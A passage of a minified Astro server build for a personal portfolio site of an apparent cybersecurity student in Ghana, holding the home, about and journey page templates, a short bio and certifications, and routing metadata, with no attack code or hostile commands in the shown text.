ht,Wo,Bl,Po,Wl,To,Tl,zl,Pe,Il,zo,Ml,ie,Rl,Io,Ll,$l,Hl,Ze=F(()=>{O();We();ht="/src/content/",Wo=Object.assign({"/src/content/work/aws-cpp.md":()=>Promise.resolve().then(()=>(lo(),ro)),"/src/content/work/peh/blackpearl.md":()=>Promise.resolve().then(()=>(uo(),co))}),Bl=Ve({globResult:Wo,contentDir:ht}),Po=Object.assign({}),Wl=Ve({globResult:Po,contentDir:ht});Ve({globResult:{...Wo,...Po},contentDir:ht});To={};To={work:{type:"content",entries:{"aws-cpp":"/src/content/work/aws-cpp.md","peh/blackpearl":"/src/content/work/peh/blackpearl.md"}}};Tl=Object.assign({"/src/content/work/aws-cpp.md":()=>Promise.resolve().then(()=>(Ao(),vo)),"/src/content/work/peh/blackpearl.md":()=>Promise.resolve().then(()=>(Bo(),ko))}),zl=Ve({globResult:Tl,contentDir:ht}),Pe=Qa({contentCollectionToEntryMap:Bl,dataCollectionToEntryMap:Wl,getRenderEntryImport:Pl(zl)}),Il=P(),zo=B(async(e,n,a)=>{let t=e.createAstro(Il,n,a);t.self=zo;let{href:o}=t.props;return h`${z()}<a${T(o,"href")} class="astro-BALV45LP">${ne(e,a.default)}</a>`},"/Users/darth/Desktop/portfolio-website/src/components/CallToAction.astro",void 0),Ml=P(),ie=B(async(e,n,a)=>{let t=e.createAstro(Ml,n,a);return t.self=ie,h`${z()}<aside class="astro-RCDZUQ3A">
  <div class="astro-RCDZUQ3A">
    <h2 class="astro-RCDZUQ3A">Let's connect and make it happen!</h2>
    <p class="astro-RCDZUQ3A">I'm ready and excited to see what you have in store for me.</p>
  </div>

  ${f(e,"CallToAction",zo,{href:"mailto:darthassan@skiff.com",class:"astro-RCDZUQ3A"},{default:o=>h`
    Contact me
    ${f(o,"Icon",H,{icon:"paper-plane-tilt",size:"1.2em",class:"astro-RCDZUQ3A"})}
  `})}
</aside>`},"/Users/darth/Desktop/portfolio-website/src/components/ContactCTA.astro",void 0),Rl=P();Io=B(async(e,n,a)=>{let t=e.createAstro(Rl,n,a);t.self=Io;let{entry:o}=t.props,{Content:s}=await o.render();return h`${f(e,"BaseLayout",X,{title:o.data.title,description:o.data.description,class:"astro-IGFJMSB2"},{default:i=>h`
  ${z()}<div class="stack gap-20 astro-IGFJMSB2">
    <div class="stack gap-15 astro-IGFJMSB2">
      <header class="astro-IGFJMSB2">
        <div class="wrapper stack gap-2 astro-IGFJMSB2">
          <a class="back-link astro-IGFJMSB2" href="/journey/">${f(i,"Icon",H,{icon:"arrow-left",class:"astro-IGFJMSB2"})} Journey</a>
          ${f(i,"Hero",ee,{title:o.data.title,align:"start",class:"astro-IGFJMSB2"},{default:l=>h`
            <div class="details astro-IGFJMSB2">
              <div class="tags astro-IGFJMSB2">
                ${o.data.tags.map(c=>h`${f(l,"Pill",be,{class:"astro-IGFJMSB2"},{default:u=>h`${c}`})}`)}
              </div>
              <p class="description astro-IGFJMSB2">${o.data.description}</p>
            </div>
          `})}
        </div>
      </header>
      <main class="wrapper astro-IGFJMSB2">
        <div class="stack gap-10 content astro-IGFJMSB2">
          ${o.data.img&&h`<img${T(o.data.img,"src")}${T(o.data.img_alt||"","alt")} class="astro-IGFJMSB2">`}
          <div class="content astro-IGFJMSB2">
            ${f(i,"Content",s,{class:"astro-IGFJMSB2"})}
          </div>
        </div>
      </main>
    </div>
    ${f(i,"ContactCTA",ie,{class:"astro-IGFJMSB2"})}
  </div>
`})}`},"/Users/darth/Desktop/portfolio-website/src/pages/journey/[...slug].astro",void 0),Ll="/Users/darth/Desktop/portfolio-website/src/pages/journey/[...slug].astro",$l="/journey/[...slug]",Hl=Object.freeze(Object.defineProperty({__proto__:null,default:Io,file:Ll,getStaticPaths:jl,url:$l},Symbol.toStringTag,{value:"Module"}))});var Lo={};$(Lo,{$:()=>Je,i:()=>ql});var _l,Je,Ol,Ro,Nl,jo,Ul,Gl,ql,un=F(()=>{O();Ze();We();_l=P(),Je=B(async(e,n,a)=>{let t=e.createAstro(_l,n,a);t.self=Je;let{variant:o}=t.props;return h`${z()}<ul${T([["grid",{offset:o==="offset",small:o==="small"}],"astro-VC5TSDMU"],"class:list")}>
	${ne(e,a.default)}
</ul>`},"/Users/darth/Desktop/portfolio-website/src/components/Grid.astro",void 0),Ol=P(),Ro=B(async(e,n,a)=>{let t=e.createAstro(Ol,n,a);return t.self=Ro,h`${z()}<section class="box skills astro-AB4IHPZS">
  <div class="stack gap-2 lg:gap-4 astro-AB4IHPZS">
    ${f(e,"Icon",H,{icon:"terminal-window",color:"var(--accent-regular)",size:"2.5rem",gradient:!0,class:"astro-AB4IHPZS"})}
    <h2 class="astro-AB4IHPZS">Get my hands dirty</h2>
    <p class="astro-AB4IHPZS">
      I am more than ready to roll up my sleeves and dive headfirst into the
      world of cybersecurity.
    </p>
  </div>
  <div class="stack gap-2 lg:gap-4 astro-AB4IHPZS">
    ${f(e,"Icon",H,{icon:"code",color:"var(--accent-regular)",size:"2.5rem",gradient:!0,class:"astro-AB4IHPZS"})}
    <h2 class="astro-AB4IHPZS">Ready to learn</h2>
    <p class="astro-AB4IHPZS">My desire to learn and excel in cybersecurity is unmatched.</p>
  </div>
  <div class="stack gap-2 lg:gap-4 astro-AB4IHPZS">
    ${f(e,"Icon",H,{icon:"strategy",color:"var(--accent-regular)",size:"2.5rem",gradient:!0,class:"astro-AB4IHPZS"})}
    <h2 class="astro-AB4IHPZS">Driven</h2>
    <p class="astro-AB4IHPZS">
      I am fueled by an insatiable drive to stay ahead of the curve in
      cybersecurity.
    </p>
  </div>
</section>`},"/Users/darth/Desktop/portfolio-website/src/components/Skills.astro",void 0),Nl=P(),jo=B(async(e,n,a)=>{let t=e.createAstro(Nl,n,a);return t.self=jo,(await Pe("work")).sort((o,s)=>s.data.publishDate.valueOf()-o.data.publishDate.valueOf()).slice(0,4),h`${f(e,"BaseLayout",X,{class:"astro-J7PV25F6"},{default:o=>h`
  ${z()}<div class="stack gap-20 lg:gap-48 astro-J7PV25F6">
    <div class="wrapper stack gap-8 lg:gap-20 astro-J7PV25F6">
      <header class="hero astro-J7PV25F6">
        ${f(o,"Hero",ee,{title:"Hello, my name is David Arthur",tagline:"I am an eager and driven cybersecurity enthusiast who is currently based in Ghana.",align:"start",class:"astro-J7PV25F6"},{default:s=>h`
          <a href="about" class="roles astro-J7PV25F6">
            ${f(s,"Pill",be,{class:"astro-J7PV25F6"},{default:i=>h`${f(i,"Icon",H,{icon:"arrow-right",size:"1.33em",class:"astro-J7PV25F6"})}Learn more`})}
          </a>
        `})}

        <img alt="Arthur David smiling in an African shirt and tortoise shell glasses" width="480" height="620" src="https://res.cloudinary.com/drup8mw79/image/upload/v1676856460/darthassan/posts/me_ziz1zf.jpg" class="astro-J7PV25F6">
      </header>

      ${f(o,"Skills",Ro,{class:"astro-J7PV25F6"})}
    </div>

    <main class="wrapper stack gap-20 lg:gap-48 astro-J7PV25F6">
      <!-- <section class="section with-background with-cta">
        <header class="section-header stack gap-2 lg:gap-4">
          <h3>Learning Journey</h3>
          <p>Take a look at what I have been up to.</p>
        </header>

        <div class="gallery">
          <Grid variant="offset">
            {
              projects.map((project) => (
                <li>
                  <PortfolioPreview project={project} />
                </li>
              ))
            }
          </Grid>
        </div>

        <div class="cta">
          <CallToAction href="/journey/">
            View All
            <Icon icon="arrow-right" size="1.2em" />
          </CallToAction>
        </div>
      </section> -->

      <section class="section with-background bg-variant astro-J7PV25F6">
        <header class="section-header stack gap-2 lg:gap-4 astro-J7PV25F6">
          <h3 class="astro-J7PV25F6">My Crib</h3>
          <p class="astro-J7PV25F6">
            Take a look below at some places I send time horning my
            Cybersecurity skills
          </p>
        </header>

        <div class="gallery astro-J7PV25F6">
          ${f(o,"Grid",Je,{variant:"small",class:"astro-J7PV25F6"},{default:s=>h`${["TryHackMe","PicoCTF","TCM Academy","INE (eJPTv2)","daily.dev"].map(i=>h`<li class="mention-card astro-J7PV25F6">
                  <p class="astro-J7PV25F6">${i}</p>
                </li>`)}`})}
        </div>
      </section>
    </main>

    ${f(o,"ContactCTA",ie,{class:"astro-J7PV25F6"})}
  </div>
`})}`},"/Users/darth/Desktop/portfolio-website/src/pages/index.astro",void 0),Ul="/Users/darth/Desktop/portfolio-website/src/pages/index.astro",Gl="",ql=Object.freeze(Object.defineProperty({__proto__:null,default:jo,file:Ul,url:Gl},Symbol.toStringTag,{value:"Module"}))});var $o={};$($o,{onRequest:()=>ae,page:()=>Kl,renderers:()=>Y});var Tu,Iu,Kl,Ho=F(()=>{Ae();Be();O();Tu=S(N(),1);U();Iu=S(G(),1);q();K();Kl=()=>Promise.resolve().then(()=>(un(),Lo)).then(e=>e.i)});var _o={};$(_o,{onRequest:()=>ae,page:()=>Vl,renderers:()=>Y});var Hu,Ou,Vl,Oo=F(()=>{Ae();Be();O();Hu=S(N(),1);U();Ou=S(G(),1);q();K();Vl=()=>Promise.resolve().then(()=>(Ze(),Mo)).then(e=>e._)});var Go={};$(Go,{default:()=>Uo,file:()=>Yl,url:()=>Ql});var Yu,Xu,Zl,No,Jl,Uo,Yl,Ql,qo=F(()=>{O();Ze();We();un();Yu=S(N(),1);U();Xu=S(G(),1);q();K();Zl=P(),No=B(async(e,n,a)=>{let t=e.createAstro(Zl,n,a);t.self=No;let{data:o,slug:s}=t.props.project;return h`${z()}<a class="card astro-LGKM4U2A"${T(`/journey/${s}`,"href")}>
  <span class="title astro-LGKM4U2A">${o.title}</span>
  <img${T(o.img,"src")}${T(o.img_alt||"","alt")} loading="lazy" decoding="async" class="astro-LGKM4U2A">
</a>`},"/Users/darth/Desktop/portfolio-website/src/components/PortfolioPreview.astro",void 0),Jl=P(),Uo=B(async(e,n,a)=>{let t=e.createAstro(Jl,n,a);t.self=Uo;let o=(await Pe("work")).sort((s,i)=>i.data.publishDate.valueOf()-s.data.publishDate.valueOf());return h`${f(e,"BaseLayout",X,{title:"My Journey | David Arthur [Assan]",description:"See my recent learning adventures"},{default:s=>h`
  ${z()}<div class="stack gap-20">
    <main class="wrapper stack gap-8">
      ${f(s,"Hero",ee,{title:"My Journey",tagline:"See my recent learning adventures",align:"start"})}
      ${f(s,"Grid",Je,{variant:"offset"},{default:i=>h`${o.map(l=>h`<li>
              ${f(i,"PortfolioPreview",No,{project:l})}
            </li>`)}`})}
    </main>
    ${f(s,"ContactCTA",ie,{})}
  </div>
`})}`},"/Users/darth/Desktop/portfolio-website/src/pages/journey.astro",void 0),Yl="/Users/darth/Desktop/portfolio-website/src/pages/journey.astro",Ql="/journey"});var Ko={};$(Ko,{onRequest:()=>ae,page:()=>Xl,renderers:()=>Y});var ap,sp,Xl,Vo=F(()=>{Ae();Be();O();ap=S(N(),1);U();sp=S(G(),1);q();K();Xl=()=>Promise.resolve().then(()=>(qo(),Go))});var Jo={};$(Jo,{default:()=>Zo,file:()=>tc,url:()=>nc});var mp,fp,ec,Zo,tc,nc,Yo=F(()=>{O();We();Ze();mp=S(N(),1);U();fp=S(G(),1);q();K();ec=P(),Zo=B(async(e,n,a)=>{let t=e.createAstro(ec,n,a);return t.self=Zo,h`${f(e,"BaseLayout",X,{title:"About | David Arthur [Assan]",description:"About Jeanine White Lorem Ipsum",class:"astro-KH7BTL4R"},{default:o=>h`
  ${z()}<div class="stack gap-20 astro-KH7BTL4R">
    <main class="wrapper about astro-KH7BTL4R">
      ${f(o,"Hero",ee,{title:"About",tagline:"Thanks for stopping by. Read below to learn more about myself and my background.",class:"astro-KH7BTL4R"},{default:s=>h`
        <img width="1553" height="873" src="https://res.cloudinary.com/drup8mw79/image/upload/v1676856457/darthassan/posts/me-at-work_acjznc.jpg" alt="assan at a desk working" class="astro-KH7BTL4R">
      `})}

      <section class="astro-KH7BTL4R">
        <h2 class="section-title astro-KH7BTL4R">Background</h2>
        <div class="content astro-KH7BTL4R">
          <p class="astro-KH7BTL4R">
            As an eager and driven cybersecurity enthusiast, I'm honing my
            expertise in the dynamic and challenging domains of web penetration
            testing and malware analysis. I'm committed to leveraging my skills
            to fortify the security of digital ecosystems and safeguard against
            the dangers of malicious cyber threats. I possess:
          </p>
          <ul class="astro-KH7BTL4R">
            <li class="astro-KH7BTL4R">Knowledge in scripting languages including Python</li>
            <li class="astro-KH7BTL4R">
              Knowledge with security toolkits such as Kali Linux, Metasploit,
              and Burp Suite Community.
            </li>
            <li class="astro-KH7BTL4R">
              Proficient in translating information from technical to executive
              or management terminology
            </li>
          </ul>
        </div>
      </section>

      <section class="astro-KH7BTL4R">
        <h2 class="section-title astro-KH7BTL4R">Education</h2>
        <div class="content astro-KH7BTL4R">
          <h5 class="astro-KH7BTL4R">University of Ghana [2019]</h5>
          <p class="astro-KH7BTL4R">Bachelor’s, Information Technology</p>
        </div>
      </section>
      <section class="astro-KH7BTL4R">
        <h2 class="section-title astro-KH7BTL4R">Certifications/Courses</h2>
        <div class="content astro-KH7BTL4R">
          <ul class="astro-KH7BTL4R">
            <li class="astro-KH7BTL4R">AWS Certified Cloud Practitioner (CCP)</li>
            <li class="astro-KH7BTL4R">Practical Ethical Hacking course (PEH) - TCM security</li>
            <li class="astro-KH7BTL4R">Google IT Support Certificate</li>
            <li class="astro-KH7BTL4R">
              Data Analysis and Visualization with Microsoft Power BI - Udacity
            </li>
            <li class="astro-KH7BTL4R">Programming for Data Science for Enterprise - Udacity</li>
          </ul>
        </div>
      </section>
      <section class="astro-KH7BTL4R">
        <h2 class="section-title astro-KH7BTL4R">Experience</h2>
        <div class="content astro-KH7BTL4R">
          <h5 class="astro-KH7BTL4R">WACCI, University of Ghana - Programmes Officer [2023]</h5>
          <ul class="astro-KH7BTL4R">
            <li class="astro-KH7BTL4R">
              Network troubleshooting: Regardless of the central management from
              the University of Ghana, I am responsible for resolving issues
              with wired and wireless connectivity at the Centre’s level and
              ensuring a consistent higher uptime.
            </li>
            <li class="astro-KH7BTL4R">
              Laboratory management: I manage the computers in the
              bioinformatics laboratory using windows active directory to
              frequently install patches and applications.
            </li>
            <li class="astro-KH7BTL4R">
              End-User Support: I assist students’ staff and faculty to solve
              issues with their computers ranging from software to hardware.
            </li>
            <li class="astro-KH7BTL4R">
              Training: Perform routine cyber security training for students,
              staff and faculty members to keep them up to date on how to
              protect themselves and the organization from cyber incidents.
            </li>
            <li class="astro-KH7BTL4R">
              IT policies: consult with relevant departments to implements IT
              policies such as 2FA to add additional layer of security on the
              organization’s accounts.
            </li>
            <li class="astro-KH7BTL4R">
              Communication and visibility: I develop contents and visuals to
              promote the Centre’s activities on various social media platforms.
            </li>
          </ul>
          <h5 class="my-5 astro-KH7BTL4R">
            African Plant Breeders Association - IT Officer [2023]
          </h5>

          <ul class="astro-KH7BTL4R">
            <li class="astro-KH7BTL4R">
              Oversee the association’s website management by designing and
              uploading content.
            </li>
            <li class="astro-KH7BTL4R">
              Collaborate with international partners around the globe to host
              hybrid events of over 1,000 participants
            </li>
            <li class="astro-KH7BTL4R">
              Provide technical advice and assistance where needed regarding
              security related issues as well as best practices.
            </li>
          </ul>
        </div>
      </section>
      <section class="astro-KH7BTL4R">
        <h2 class="section-title astro-KH7BTL4R">Volunteering</h2>
        <div class="content astro-KH7BTL4R">
          <h5 class="astro-KH7BTL4R">Web Developer - Woogle Africa [2020]</h5>
          <p class="astro-KH7BTL4R">
            Woogle is a group of ICT specialists whose main aim is to train
            aspiring children who are eager to learn more about IT, specifically
            programming. We target basic school pupils and reach out to them
            with our content.
          </p>
        </div>
      </section>
      <section class="astro-KH7BTL4R">
        <h2 class="section-title astro-KH7BTL4R">Hobbies & Interests</h2>
        <div class="content astro-KH7BTL4R">
          <p class="astro-KH7BTL4R">Listening to cyber security podcasts and building home labs</p>
        </div>
      </section>
    </main>

    ${f(o,"ContactCTA",ie,{class:"astro-KH7BTL4R"})}
  </div>
`})}`},"/Users/darth/Desktop/portfolio-website/src/pages/about.astro",void 0),tc="/Users/darth/Desktop/portfolio-website/src/pages/about.astro",nc="/about"});var Qo={};$(Qo,{onRequest:()=>ae,page:()=>ac,renderers:()=>Y});var vp,bp,ac,Xo=F(()=>{Ae();Be();O();vp=S(N(),1);U();bp=S(G(),1);q();K();ac=()=>Promise.resolve().then(()=>(Yo(),Jo))});var es={};$(es,{onRequest:()=>ae,page:()=>oc,renderers:()=>Y});var Fp,Bp,oc,ts=F(()=>{Ae();Be();O();Fp=S(N(),1);U();Bp=S(G(),1);q();K();oc=()=>Promise.resolve().then(()=>(We(),io)).then(e=>e._)});O();Ae();var Rp=S(G(),1),jp=S(N(),1);U();q();K();process.argv=[];var sc=Symbol.for("astro.clientAddress");function os(e){let n=new lt(e);return{default:async t=>{let o=n.match(t);Reflect.set(t,sc,t.headers.get("x-forwarded-for"));let s=await n.render(t,o);if(n.setCookieHeaders)for(let i of n.setCookieHeaders(s))s.headers.append("Set-Cookie",i);return s}}}var ns=Object.freeze(Object.defineProperty({__proto__:null,createExports:os},Symbol.toStringTag,{value:"Module"})),ic=()=>Promise.resolve().then(()=>(Ho(),$o)),rc=()=>Promise.resolve().then(()=>(Oo(),_o)),lc=()=>Promise.resolve().then(()=>(Vo(),Ko)),cc=()=>Promise.resolve().then(()=>(Xo(),Qo)),uc=()=>Promise.resolve().then(()=>(ts(),es)),pc=new Map([["src/pages/index.astro",ic],["src/pages/journey/[...slug].astro",rc],["src/pages/journey.astro",lc],["src/pages/about.astro",cc],["src/pages/404.astro",uc]]),ss=Object.assign(Za({adapterName:"@astrojs/vercel/edge",routes:[{file:"",links:[],scripts:[{type:"inline",value:`addEventListener("load",()=>document.documentElement.classList.add("loaded"));class i extends HTMLElement{constructor(){super(),this.appendChild(this.querySelector("template").content.cloneNode(!0));const e=this.querySelector("button"),t=document.getElementById("menu-content");t.hidden=!0;const n=s=>{e.setAttribute("aria-expanded",s?"true":"false"),t.hidden=!s};e.addEventListener("click",()=>n(t.hidden));const d=s=>{n(s.matches),e.hidden=s.matches},c=window.matchMedia("(min-width: 50em)");d(c),c.addEventListener("change",d)}}customElements.define("menu-button",i);class r extends HTMLElement{constructor(){super();const e=this.querySelector("button"),t=n=>{document.documentElement.classList[n?"add":"remove"]("theme-dark"),e.setAttribute("aria-pressed",String(n))};e.addEventListener("click",()=>t(!this.isDark())),t(this.isDark())}isDark(){return document.documentElement.classList.contains("theme-dark")}}customElements.define("theme-toggle",r);
`},{type:"external",value:"/_astro/page.d7d8fe59.js"}],styles:[{type:"external",src:"/_astro/404.fa507ea5.css"},{type:"external",src:"/_astro/index.6ef6ff02.css"},{type:"external",src:"/_astro/404.d2e14741.css"},{type:"external",src:"/_astro/about.e1a63a96.css"},{type:"external",src:"/_astro/index.0158ebdb.css"},{type:"external",src:"/_astro/about.93ec11f1.css"}],routeData:{route:"/",type:"page",pattern:"^\\/$",segments:[],params:[],component:"src/pages/index.astro",pathname:"/",prerender:!1,_meta:{trailingSlash:"ignore"}}},{file:"",links:[],scripts:[{type:"inline",value:`addEventListener("load",()=>document.documentElement.classList.add("loaded"));class i extends HTMLElement{constructor(){super(),this.appendChild(this.querySelector("template").content.cloneNode(!0));const e=this.querySelector("button"),t=document.getElementById("menu-content");t.hidden=!0;const n=s=>{e.setAttribute("aria-expanded",s?"true":"false"),t.hidden=!s};e.addEventListener("click",()=>n(t.hidden));const d=s=>{n(s.matches),e.hidden=s.matches},c=window.matchMedia("(min-width: 50em)");d(c),c.addEventListener("change",d)}}customElements.define("menu-button",i);class r extends HTMLElement{constructor(){super();const e=this.querySelector("button"),t=n=>{document.documentElement.classList[n?"add":"remove"]("theme-dark"),e.setAttribute("aria-pressed",String(n))};e.addEventListener("click",()=>t(!this.isDark())),t(this.isDark())}isDark(){return document.documentElement.classList.contains("theme-dark")}}customElements.define("theme-toggle",r);
`},{type:"external",value:"/_astro/page.d7d8fe59.js"}],styles:[{type:"external",src:"/_astro/404.fa507ea5.css"},{type:"external",src:"/_astro/about.e1a63a96.css"},{type:"external",src:"/_astro/about.93ec11f1.css"},{type:"external",src:"/_astro/404.d2e14741.css"},{type:"external",src:"/_astro/_...slug_.bcae6a85.css"}],routeData:{route:"/journey/[...slug]",type:"page",pattern:"^\\/journey(?:\\/(.*?))?\\/?$",segments:[[{content:"journey",dynamic:!1,spread:!1}],[{content:"...slug",dynamic:!0,spread:!0}]],params:["...slug"],component:"src/pages/journey/[...slug].astro",prerender:!1,_meta:{trailingSlash:"ignore"}}},{file:"",links:[],scripts:[{type:"inline",value:`addEventListener("load",()=>document.documentElement.classList.add("loaded"));class i extends HTMLElement{constructor(){super(),this.appendChild(this.querySelector("template").content.cloneNode(!0));const e=this.querySelector("button"),t=document.getElementById("menu-content");t.hidden=!0;const n=s=>{e.setAttribute("aria-expanded",s?"true":"false"),t.hidden=!s};e.addEventListener("click",()=>n(t.hidden));const d=s=>{n(s.matches),e.hidden=s.matches},c=window.matchMedia("(min-width: 50em)");d(c),c.addEventListener("change",d)}}customElements.define("menu-button",i);class r extends HTMLElement{constructor(){super();const e=this.querySelector("button"),t=n=>{document.documentElement.classList[n?"add":"remove"]("theme-dark"),e.setAttribute("aria-pressed",String(n))};e.addEventListener("click",()=>t(!this.isDark())),t(this.isDark())}isDark(){return document.documentElement.classList.contains("theme-dark")}}customElements.define("theme-toggle",r);
`},{type:"external",value:"/_astro/page.d7d8fe59.js"}],styles:[{type:"external",src:"/_astro/404.fa507ea5.css"},{type:"external",src:"/_astro/about.e1a63a96.css"},{type:"external",src:"/_astro/journey.7d092ef0.css"},{type:"external",src:"/_astro/about.93ec11f1.css"},{type:"external",src:"/_astro/index.6ef6ff02.css"}],routeData:{route:"/journey",type:"page",pattern:"^\\/journey\\/?$",segments:[[{content:"journey",dynamic:!1,spread:!1}]],params:[],component:"src/pages/journey.astro",pathname:"/journey",prerender:!1,_meta:{trailingSlash:"ignore"}}},{file:"",links:[],scripts:[{type:"inline",value:`addEventListener("load",()=>document.documentElement.classList.add("loaded"));class i extends HTMLElement{constructor(){super(),this.appendChild(this.querySelector("template").content.cloneNode(!0));const e=this.querySelector("button"),t=document.getElementById("menu-content");t.hidden=!0;const n=s=>{e.setAttribute("aria-expanded",s?"true":"false"),t.hidden=!s};e.addEventListener("click",()=>n(t.hidden));const d=s=>{n(s.matches),e.hidden=s.matches},c=window.matchMedia("(min-width: 50em)");d(c),c.addEventListener("change",d)}}customElements.define("menu-button",i);class r extends HTMLElement{constructor(){super();const e=this.querySelector("button"),t=n=>{document.documentElement.classList[n?"add":"remove"]("theme-dark"),e.setAttribute("aria-pressed",String(n))};e.addEventListener("click",()=>t(!this.isDark())),t(this.isDark())}isDark(){return document.documentElement.classList.contains("theme-dark")}}customElements.define("theme-toggle",r);
`},{type:"external",value:"/_astro/page.d7d8fe59.js"}],styles:[{type:"external",src:"/_astro/404.fa507ea5.css"},{type:"external",src:"/_astro/about.e1a63a96.css"},{type:"external",src:"/_astro/about.60216e99.css"},{type:"external",src:"/_astro/about.93ec11f1.css"}],routeData:{route:"/about",type:"page",pattern:"^\\/about\\/?$",segments:[[{content:"about",dynamic:!1,spread:!1}]],params:[],component:"src/pages/about.astro",pathname:"/about",prerender:!1,_meta:{trailingSlash:"ignore"}}},{file:"",links:[],scripts:[{type:"inline",value:`addEventListener("load",()=>document.documentElement.classList.add("loaded"));class i extends HTMLElement{constructor(){super(),this.appendChild(this.querySelector("template").content.cloneNode(!0));const e=this.querySelector("button"),t=document.getElementById("menu-content");t.hidden=!0;const n=s=>{e.setAttribute("aria-expanded",s?"true":"false"),t.hidden=!s};e.addEventListener("click",()=>n(t.hidden));const d=s=>{n(s.matches),e.hidden=s.matches},c=window.matchMedia("(min-width: 50em)");d(c),c.addEventListener("change",d)}}customElements.define("menu-button",i);class r extends HTMLElement{constructor(){super();const e=this.querySelector("button"),t=n=>{document.documentElement.classList[n?"add":"remove"]("theme-dark"),e.setAttribute("aria-pressed",String(n))};e.addEventListener("click",()=>t(!this.isDark())),t(this.isDark())}isDark(){return document.documentElement.classList.contains("theme-dark")}}customElements.define("theme-toggle",r);
`},{type:"external",value:"/_astro/page.d7d8fe59.js"}],styles:[{type:"external",src:"/_astro/404.fa507ea5.css"},{type:"external",src:"/_astro/404.d2e14741.css"},{type:"external",src:"/_astro/404.c341ec27.css"},{type:"external",src:"/_astro/about.93ec11f1.css"}],routeData:{route:"/404",type:"page",pattern:"^\\/404\\/?$",segments:[[{content:"404",dynamic:!1,spread:!1}]],params:[],component:"src/pages/404.astro",pathname:"/404",prerender:!1,_meta:{trailingSlash:"ignore"}}}],base:"/",compressHTML:!1,markdown:{drafts:!1,syntaxHighlight:"shiki",shikiConfig:{langs:[],theme:"github-dark",wrap:!1},remarkPlugins:[],rehypePlugins:[],remarkRehype:{},gfm:!0,smartypants:!0},componentMetadata:[["/Users/darth/Desktop/portfolio-website/src/pages/404.astro",{propagation:"none",containsHead:!0}],["/Users/darth/Desktop/portfolio-website/src/pages/about.astro",{propagation:"none",containsHead:!0}],["/Users/darth/Desktop/portfolio-website/src/pages/index.astro",{propagation:"in-tree",containsHead:!0}],["/Users/darth/Desktop/portfolio-website/src/pages/journey.astro",{propagation:"in-tree",containsHead:!0}],["/Users/darth/Desktop/portfolio-website/src/pages/journey/[...slug].astro",{propagation:"in-tree",containsHead:!0}],["\0astro:content",{propagation:"in-tree",containsHead:!1}],["\0@astro-page:src/pages/index@_@astro",{propagation:"in-tree",containsHead:!1}],["\0@astrojs-ssr-virtual-entry",{propagation:"in-tree",containsHead:!1}],["\0@astro-page:src/pages/journey@_@astro",{propagation:"in-tree",containsHead:!1}],["\0@astro-page:src/pages/journey/[...slug]@_@astro",{propagation:"in-tree",containsHead:!1}]],renderers:[],clientDirectives:[["idle",'(()=>{var i=t=>{let e=async()=>{await(await t())()};"requestIdleCallback"in window?window.requestIdleCallback(e):setTimeout(e,200)};(self.Astro||(self.Astro={})).idle=i;window.dispatchEvent(new Event("astro:idle"));})();'],["load",'(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();'],["media",'(()=>{var s=(i,t)=>{let a=async()=>{await(await i())()};if(t.value){let e=matchMedia(t.value);e.matches?a():e.addEventListener("change",a,{once:!0})}};(self.Astro||(self.Astro={})).media=s;window.dispatchEvent(new Event("astro:media"));})();'],["only",'(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).only=e;window.dispatchEvent(new Event("astro:only"));})();'],["visible",'(()=>{var r=(i,c,n)=>{let s=async()=>{await(await i())()},t=new IntersectionObserver(e=>{for(let o of e)if(o.isIntersecting){t.disconnect(),s();break}});for(let e of n.children)t.observe(e)};(self.Astro||(self.Astro={})).visible=r;window.dispatchEvent(new Event("astro:visible"));})();']],entryModules:{"\0@astrojs-ssr-virtual-entry":"_@astrojs-ssr-virtual-entry.mjs","\0@astro-renderers":"renderers.mjs","\0empty-middleware":"_empty-middleware.mjs","/src/pages/about.astro":"chunks/pages/about.astro.dcac8ca1.mjs","/src/pages/journey.astro":"chunks/pages/journey.astro.1f1db04d.mjs","\0@astro-page:src/pages/index@_@astro":"chunks/index@_@astro.e5d63068.mjs","\0@astro-page:src/pages/journey/[...slug]@_@astro":"chunks/_...bdb95208.mjs","\0@astro-page:src/pages/journey@_@astro":"chunks/journey@_@astro.5c922fed.mjs","\0@astro-page:src/pages/about@_@astro":"chunks/about@_@astro.8fb5ee10.mjs","\0@astro-page:src/pages/404@_@astro":"chunks/404@_@astro.4ca77321.mjs","/Users/darth/Desktop/portfolio-website/src/content/work/aws-cpp.md?astroContentCollectionEntry=true":"chunks/aws-cpp.8a6905a0.mjs","/Users/darth/Desktop/portfolio-website/src/content/work/peh/blackpearl.md?astroContentCollectionEntry=true":"chunks/blackpearl.c046d62e.mjs","/Users/darth/Desktop/portfolio-website/src/content/work/aws-cpp.md?astroPropagatedAssets":"chunks/aws-cpp.cb6d28b2.mjs","/Users/darth/Desktop/portfolio-website/src/content/work/peh/blackpearl.md?astroPropagatedAssets":"chunks/blackpearl.075ca12e.mjs","/Users/darth/Desktop/portfolio-website/src/content/work/aws-cpp.md":"chunks/aws-cpp.1f022e7c.mjs","/Users/darth/Desktop/portfolio-website/src/content/work/peh/blackpearl.md":"chunks/blackpearl.8695d4d8.mjs","/astro/hoisted.js?q=0":"_astro/hoisted.6bf4bf29.js","astro:scripts/page.js":"_astro/page.d7d8fe59.js","astro:scripts/before-hydration.js":""},assets:["/_astro/404.d2e14741.css","/_astro/404.fa507ea5.css","/_astro/404.c341ec27.css","/_astro/_...slug_.bcae6a85.css","/_astro/about.e1a63a96.css","/_astro/about.60216e99.css","/_astro/about.93ec11f1.css","/_astro/index.6ef6ff02.css","/_astro/index.0158ebdb.css","/_astro/journey.7d092ef0.css","/favicon.svg","/_astro/page.d7d8fe59.js","/assets/backgrounds/bg-footer-dark-1440w.jpg","/assets/backgrounds/bg-footer-dark-800w.jpg","/assets/backgrounds/bg-footer-light-1440w.jpg","/assets/backgrounds/bg-footer-light-800w.jpg","/assets/backgrounds/bg-main-dark-1440w.jpg","/assets/backgrounds/bg-main-dark-800w.jpg","/assets/backgrounds/bg-main-dark.svg","/assets/backgrounds/bg-main-light-1440w.jpg","/assets/backgrounds/bg-main-light-800w.jpg","/assets/backgrounds/bg-main-light.svg","/assets/backgrounds/bg-subtle-1-dark-1440w.jpg","/assets/backgrounds/bg-subtle-1-dark-800w.jpg","/assets/backgrounds/bg-subtle-1-light-1440w.jpg","/assets/backgrounds/bg-subtle-1-light-800w.jpg","/assets/backgrounds/bg-subtle-2-dark-1440w.jpg","/assets/backgrounds/bg-subtle-2-dark-800w.jpg","/assets/backgrounds/bg-subtle-2-light-1440w.jpg","/assets/backgrounds/bg-subtle-2-light-800w.jpg","/assets/backgrounds/noise.png","/_astro/page.d